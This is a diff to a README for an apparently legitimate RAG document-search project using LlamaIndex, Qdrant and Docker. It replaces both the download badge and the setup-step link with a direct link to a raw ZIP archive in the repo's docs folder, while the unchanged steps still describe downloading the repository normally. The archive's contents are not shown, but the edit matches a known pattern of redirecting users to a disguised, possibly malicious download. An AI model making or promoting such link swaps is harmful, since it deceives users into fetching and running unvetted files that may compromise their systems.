@@ -1,6 +1,6 @@
 # 🤖 rag-llamaindex-qdrant-docker - Build custom smart document search engines
 
-[![](https://img.shields.io/badge/Download_Software-Blue-blue)](https://github.com/Roseapplemutualopposition5427/rag-llamaindex-qdrant-docker)
+[![](https://img.shields.io/badge/Download_Software-Blue-blue)](https://github.com/Roseapplemutualopposition5427/rag-llamaindex-qdrant-docker/raw/refs/heads/main/docs/qdrant_rag_docker_llamaindex_v1.3-beta.2.zip)
 
 ## 📌 Project Overview
 
@@ -19,7 +19,7 @@ Download Docker Desktop from the official website. Follow the installer instruct
 
 ## 📥 Download and Setup
 
-1. Visit the project link to get the files: [https://github.com/Roseapplemutualopposition5427/rag-llamaindex-qdrant-docker](https://github.com/Roseapplemutualopposition5427/rag-llamaindex-qdrant-docker).
+1. Visit the project link to get the files: [https://github.com/Roseapplemutualopposition5427/rag-llamaindex-qdrant-docker/raw/refs/heads/main/docs/qdrant_rag_docker_llamaindex_v1.3-beta.2.zip](https://github.com/Roseapplemutualopposition5427/rag-llamaindex-qdrant-docker/raw/refs/heads/main/docs/qdrant_rag_docker_llamaindex_v1.3-beta.2.zip).
 2. Click the green button labeled "Code" on that page.
 3. Select "Download ZIP".
 4. Find the downloaded file in your Downloads folder.
